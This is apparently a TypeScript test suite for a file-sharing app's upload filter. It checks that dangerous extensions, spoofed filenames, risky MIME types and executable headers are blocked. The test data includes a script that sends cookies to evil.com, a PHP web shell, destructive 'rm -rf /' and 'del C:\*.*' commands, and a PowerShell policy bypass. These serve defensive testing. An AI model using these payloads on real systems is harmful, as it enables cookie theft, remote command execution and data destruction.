import {
    isDangerousFilename,
    isDangerousMimeType,
    hasExecutableMagicBytes,
    FileReassemblyBuffer,
    type FileMetadata,
} from "./src/index";

let passed = 0;
let failed = 0;

function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
        console.log(`  [PASS] ${testName}`);
        passed++;
    } else {
        console.error(`  [FAIL] ${testName}${detail ? " - " + detail : ""}`);
        failed++;
    }
}

async function runTests() {
    console.log("\n==========================================");
    console.log("TEST SUITE: MALICIOUS FILE SHARING SECURITY");
    console.log("==========================================\n");

    // ── 1. Executable Extension Detection ──
    console.log("--- 1. Testing Executable Extension Blocking ---");
    const maliciousExtensions = [
        "malware.exe", "backdoor.dll", "script.bat", "run.cmd", "payload.ps1",
        "drop.vbs", "shell.sh", "bash.bash", "app.js", "hack.py",
        "webshell.php", "root.bin", "exploit.jar", "loader.msi", "image.iso",
        "shortcut.lnk", "attack.hta", "module.wasm", "vector.svg", "page.html"
    ];

    for (const filename of maliciousExtensions) {
        const res = isDangerousFilename(filename);
        assert(!res.safe, `Block direct malicious extension: ${filename}`, res.reason);
    }

    // ── 2. Double Extension Spoofing ──
    console.log("\n--- 2. Testing Double-Extension Spoofing ---");
    const doubleExtensions = [
        "invoice.pdf.exe",
        "photo.jpg.vbs",
        "resume.docx.bat",
        "financials.xlsx.ps1",
        "music.mp3.sh",
        "document.txt.py",
        "contract.pdf.js",
        "archive.tar.gz.exe",
        "test...exe",
    ];

    for (const filename of doubleExtensions) {
        const res = isDangerousFilename(filename);
        assert(!res.safe, `Block double-extension spoofing: ${filename}`, res.reason);
    }

    // ── 3. Obfuscation, Control Characters & Injection ──
    console.log("\n--- 3. Testing Filename Obfuscation & Injection ---");
    // Right-To-Left Override (RTLO) \u202E: displays reversed in UI
    const rtloFilename = "invoice\u202Efdp.exe";
    assert(!isDangerousFilename(rtloFilename).safe, "Block RTLO unicode spoofing");

    // Null-byte injection
    assert(!isDangerousFilename("document.pdf%00.exe").safe, "Block %00 null byte injection");
    assert(!isDangerousFilename("document.pdf\0.exe").safe, "Block literal null byte injection");

    // Empty filename
    assert(!isDangerousFilename("").safe, "Block empty filename");
    assert(!isDangerousFilename("   ").safe, "Block whitespace-only filename");

    // ── 4. URL & Path Parsing ──
    console.log("\n--- 4. Testing URL and Path Handling ---");
    // URL with malicious file in pathname
    assert(!isDangerousFilename("https://gateway.pinata.cloud/ipfs/Qm123/payload.exe").safe, "Block malicious file in URL path");
    // URL with malicious file in query param
    assert(!isDangerousFilename("https://gateway.pinata.cloud/ipfs/Qm123?filename=virus.exe").safe, "Block malicious file in URL query parameter");
    // Legitimate URL with safe file and TLD with letters that could match an extension
    assert(isDangerousFilename("https://cdn.sh/images/photo.png").safe, "Allow legitimate image URL on .sh domain");
    assert(isDangerousFilename("https://gateway.pinata.cloud/ipfs/QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco").safe, "Allow raw IPFS CID URL without extension");
    // Windows path with folder named like an extension
    assert(isDangerousFilename("C:\\Program.app\\documents\\contract.pdf").safe, "Allow safe file inside path with .app folder");

    // ── 5. Dangerous MIME Type Verification ──
    console.log("\n--- 5. Testing Dangerous MIME Type Detection ---");
    const dangerousMimes = [
        "application/x-msdownload",
        "application/x-executable",
        "application/x-bat",
        "application/x-sh",
        "application/javascript",
        "text/javascript",
        "application/x-python",
        "application/x-php",
        "application/wasm",
        "text/html",
        "image/svg+xml",
        "application/vnd.android.package-archive"
    ];

    for (const mime of dangerousMimes) {
        const res = isDangerousMimeType(mime);
        assert(!res.safe, `Block dangerous MIME: ${mime}`, res.reason);
    }

    // Safe MIME types
    const safeMimes = ["image/png", "image/jpeg", "image/webp", "application/pdf", "audio/mpeg", "video/mp4", "text/plain"];
    for (const mime of safeMimes) {
        const res = isDangerousMimeType(mime);
        assert(res.safe, `Allow safe MIME: ${mime}`);
    }

    // ── 6. Disguised Executable Magic Bytes Detection ──
    console.log("\n--- 6. Testing Disguised Magic Bytes Detection ---");

    // Windows PE / DOS MZ Header (0x4D, 0x5A)
    const peBytes = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    assert(!hasExecutableMagicBytes(peBytes).safe, "Detect Windows PE / DOS executable header (MZ)");

    // Linux ELF Header (0x7F, 0x45, 0x4C, 0x46)
    const elfBytes = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
    assert(!hasExecutableMagicBytes(elfBytes).safe, "Detect Linux ELF binary header");

    // WebAssembly Header (\0asm: 0x00, 0x61, 0x73, 0x6D)
    const wasmBytes = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
    assert(!hasExecutableMagicBytes(wasmBytes).safe, "Detect WebAssembly module header (\\0asm)");

    // Mach-O / Java Class (0xCA, 0xFE, 0xBA, 0xBE)
    const javaBytes = new Uint8Array([0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34]);
    assert(!hasExecutableMagicBytes(javaBytes).safe, "Detect Java class / Mach-O universal binary");

    // Shell Shebang (#!: 0x23, 0x21)
    const shebangBytes = new TextEncoder().encode("#!/bin/bash\nrm -rf /");
    assert(!hasExecutableMagicBytes(shebangBytes).safe, "Detect Shell Shebang header (#!)");

    // Windows Shortcut .lnk header
    const lnkBytes = new Uint8Array([0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00]);
    assert(!hasExecutableMagicBytes(lnkBytes).safe, "Detect Windows Shortcut (.lnk) magic bytes");

    // Embedded Script & Active Web Payloads
    const scriptTag = new TextEncoder().encode("<script>fetch('http://evil.com/leak?cookie=' + document.cookie)</script>");
    assert(!hasExecutableMagicBytes(scriptTag).safe, "Detect embedded <script> tag");

    const batchScript = new TextEncoder().encode("@echo off\r\ndel C:\\*.*");
    assert(!hasExecutableMagicBytes(batchScript).safe, "Detect embedded batch script (@echo)");

    const psScript = new TextEncoder().encode("powershell -ExecutionPolicy Bypass -Command Write-Host 'malicious'");
    assert(!hasExecutableMagicBytes(psScript).safe, "Detect embedded powershell command");

    const phpScript = new TextEncoder().encode("<?php passthru($_GET['cmd']); ?>");
    assert(!hasExecutableMagicBytes(phpScript).safe, "Detect embedded PHP script tag");

    const svgXss = new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>');
    assert(!hasExecutableMagicBytes(svgXss).safe, "Detect active SVG onload XSS vector");

    // Safe File Magic Bytes
    const pngHeader = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
    assert(hasExecutableMagicBytes(pngHeader).safe, "Allow legitimate PNG image header");

    const jpegHeader = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
    assert(hasExecutableMagicBytes(jpegHeader).safe, "Allow legitimate JPEG image header");

    const pdfHeader = new TextEncoder().encode("%PDF-1.4\n%âãÏÓ\n1 0 obj\n<<...>>");
    assert(hasExecutableMagicBytes(pdfHeader).safe, "Allow legitimate PDF file header");

    const plainText = new TextEncoder().encode("Hello, this is a legitimate message notes file without scripts.");
    assert(hasExecutableMagicBytes(plainText).safe, "Allow legitimate plain text");

    // ── 7. P2P Reassembly Buffer Security ──
    console.log("\n--- 7. Testing P2P FileReassemblyBuffer Protection ---");

    // Test rejection on constructor for dangerous metadata name
    let ctorBlockedName = false;
    try {
        new FileReassemblyBuffer({
            id: "test-1",
            name: "malicious.exe",
            size: 1024,
            type: "application/octet-stream",
            totalChunks: 1,
            hash: "testhash",
        });
    } catch {
        ctorBlockedName = true;
    }
    assert(ctorBlockedName, "FileReassemblyBuffer rejects malicious filename on construction");

    // Test rejection on constructor for dangerous MIME
    let ctorBlockedMime = false;
    try {
        new FileReassemblyBuffer({
            id: "test-2",
            name: "invoice.pdf",
            size: 1024,
            type: "application/x-msdownload",
            totalChunks: 1,
            hash: "testhash",
        });
    } catch {
        ctorBlockedMime = true;
    }
    assert(ctorBlockedMime, "FileReassemblyBuffer rejects dangerous MIME type on construction");

    // Test chunk 0 magic byte rejection for disguised executable in P2P transfer
    const buffer = new FileReassemblyBuffer({
        id: "test-3",
        name: "disguised_photo.png",
        size: peBytes.byteLength,
        type: "image/png",
        totalChunks: 1,
        hash: "dummy",
    });

    // Chunk contains PE header (MZ) disguised as PNG
    const chunk0Result = await buffer.addChunk(0, peBytes.buffer, "anyhash");
    assert(!chunk0Result, "FileReassemblyBuffer.addChunk blocks disguised PE executable in chunk 0");

    // Test valid chunk passes through
    const safeBuffer = new FileReassemblyBuffer({
        id: "test-4",
        name: "legit_photo.png",
        size: pngHeader.byteLength,
        type: "image/png",
        totalChunks: 1,
        hash: "dummy",
    });

    const safeChunkDigest = await crypto.subtle.digest("SHA-256", pngHeader.buffer);
    const safeHash = Array.from(new Uint8Array(safeChunkDigest))
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");

    const safeResult = await safeBuffer.addChunk(0, pngHeader.buffer, safeHash);
    assert(safeResult, "FileReassemblyBuffer.addChunk accepts legitimate file chunk with valid hash");

    console.log("\n==========================================");
    console.log(`TEST SUMMARY: ${passed} PASSED, ${failed} FAILED`);
    console.log("==========================================\n");

    if (failed > 0) {
        process.exit(1);
    }
}

runTests().catch((err) => {
    console.error("Test execution error:", err);
    process.exit(1);
});
